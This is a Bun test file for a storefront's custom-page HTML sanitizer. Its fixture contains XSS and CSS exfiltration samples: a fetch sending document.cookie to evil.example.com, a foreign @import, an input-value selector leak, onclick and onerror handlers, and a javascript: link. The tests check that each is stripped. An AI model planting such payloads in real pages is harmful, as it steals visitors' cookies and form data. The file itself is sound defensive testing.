import { describe, expect, test } from 'bun:test'
import { db } from '../src/db/client'
import { users } from '../src/db/schema'
import { sanitizeCustomPage } from '../src/lib/sanitize'
import { Client } from './helpers'

const PAGE = `<!doctype html><html><head>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
<link href="https://evil.example.com/x.css" rel="stylesheet">
<script src="https://cdn.tailwindcss.com"></script>
<style>
@import url("https://evil.example.com/steal.css");
.hero{background:#111;color:#fff}
input[value^="a"]{background:url(https://evil.example.com/?a)}
</style></head>
<body><section class="hero bg-black text-white p-8" onclick="steal()">
<h1>{{nom}}</h1><p>Seulement {{prix}} au lieu de {{prix_barre}}</p>
<a href="javascript:alert(1)">piège</a><a href="#commander" class="btn">Commander</a>
<script>fetch('https://evil.example.com?c='+document.cookie)</script>
<form action="https://evil.example.com"><input name="carte"></form>
<img src="https://cdn.example.com/a.jpg" onerror="steal()">
<svg viewBox="0 0 24 24"><path d="M0 0h24"/></svg>
{{formulaire}}
</section></body></html>`

describe('page HTML libre : nettoyage', () => {
  const r = sanitizeCustomPage(PAGE)
  test('scripts, handlers, formulaires étrangers et javascript: retirés', () => {
    expect(r.html).not.toContain('<script')
    expect(r.html).not.toContain('onclick')
    expect(r.html).not.toContain('onerror')
    expect(r.html).not.toContain('<form')
    expect(r.html).not.toContain('<input')
    expect(r.html).not.toContain('javascript:')
  })
  test('CSS espion et @import étranger retirés, styles gardés', () => {
    expect(r.css).toContain('.hero{background:#111')
    expect(r.css).not.toContain('evil.example.com')
    expect(r.css).not.toContain('[value')
  })
  test('structure, classes, svg, repères, polices Google et Tailwind gardés', () => {
    expect(r.html).toContain('class="hero bg-black text-white p-8"')
    expect(r.html).toContain('{{formulaire}}')
    expect(r.html).toContain('{{prix}}')
    expect(r.html).toContain('<svg')
    expect(r.html).toContain('href="#commander"')
    expect(r.fonts).toEqual(['https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap'])
    expect(r.tailwind).toBe(true)
  })
})

describe('page HTML libre : enregistrement et page publique', () => {
  test('la version servie est nettoyée, l’original reste éditable', async () => {
    const owner = new Client()
    await db.insert(users).values({ email: 'custom-page@test.dev', name: 'O', passwordHash: await Bun.password.hash('motdepasse-solide', { algorithm: 'argon2id' }) }).onConflictDoNothing()
    await owner.post('/api/auth/login', { email: 'custom-page@test.dev', password: 'motdepasse-solide' })
    const s = (await owner.post('/api/stores', { name: 'Libre', slug: 'page-libre', currency: 'XOF' })).body.id
    const p = await owner.post(`/api/stores/${s}/products`, { type: 'physical', name: 'Montre', price: 9000, isActive: true, content: { customPage: { enabled: true, source: PAGE } } })
    expect(p.status).toBe(201)
    expect(p.body.content.customPage.source).toContain('<script>fetch')
    expect(p.body.content.customPage.html).not.toContain('<script')
    const pub = await new Client().get(`/api/v1/checkout/page-libre/${p.body.id}`)
    expect(pub.body.product.content.customPage.html).toContain('{{formulaire}}')
    expect(pub.body.product.content.customPage.html).not.toContain('onclick')
    expect(pub.body.product.content.customPage.source).toBe('')
  })
})
